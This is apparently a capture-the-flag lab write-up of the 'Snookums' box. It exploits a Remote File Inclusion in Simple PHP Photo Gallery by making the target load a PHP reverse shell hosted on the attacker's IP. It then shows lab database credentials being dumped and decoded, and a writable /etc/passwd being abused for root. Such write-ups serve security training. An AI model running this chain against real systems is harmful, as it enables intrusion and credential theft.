# Snookums

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.58 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 22:49 +08
Warning: 192.168.197.58 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.197.58
Host is up (0.17s latency).
Not shown: 65484 filtered tcp ports (no-response), 43 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

Lots of ports open.

### PHP Gallery -> RFI + RCE

Port 80 was running a Simple PHP Photo Gallery instance:

<figure><img src="../../../.gitbook/assets/image (1533).png" alt=""><figcaption></figcaption></figure>

This thing might be vulnerable to an RFI based on `searchsploit`:

```
$ searchsploit SimplePHP
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
FREEsimplePHPGuestbook - 'Guestbook.php' Remote Code Execu | php/webapps/7079.txt
SimplePHPGal 0.7 - Remote File Inclusion                   | php/webapps/48424.txt
```

The PoC is quite simple to test:

```
### Poc  :

[+]   site.com/image.php?img= [ PAYLOAD ]
```

And it does work since I can make the website send requests to my HTTP server:

<figure><img src="../../../.gitbook/assets/image (3536).png" alt=""><figcaption></figcaption></figure>

To exploit this, we can just host a PHP reverse shell from PentestMonkey and make the website call it by visiting [http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php](http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php).

<figure><img src="../../../.gitbook/assets/image (4007).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SQL Creds -> Michael Shell

Within the `/var/www/html` file, there's a `db.php` folder that contains MySQL credentials:

```
bash-4.2$ cat db.php 
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```

Using this, we can login using `mysql`:

```
bash-4.2$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Within the MySQL database there were some credentials:

```
mysql> show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users
    -> ;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
```

These are just  `base64` encoded strings, and we can easily find the cleartext passwords. `michael` is the only user within `/home`, so we can decode his password:

```
$ echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d
HockSydneyCertify123
```

Then, just use `su`:

<figure><img src="../../../.gitbook/assets/image (2884).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

### Writeable /etc/passwd -> Root

`michael` owns `/etc/passwd`. This is findable by running `linpeas.sh`:

```
[michael@snookums ~]$ ls -la /etc/passwd
-rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
```

Using this, we can easily create a new root user.&#x20;

<figure><img src="../../../.gitbook/assets/image (3978).png" alt=""><figcaption></figcaption></figure>

Rooted!
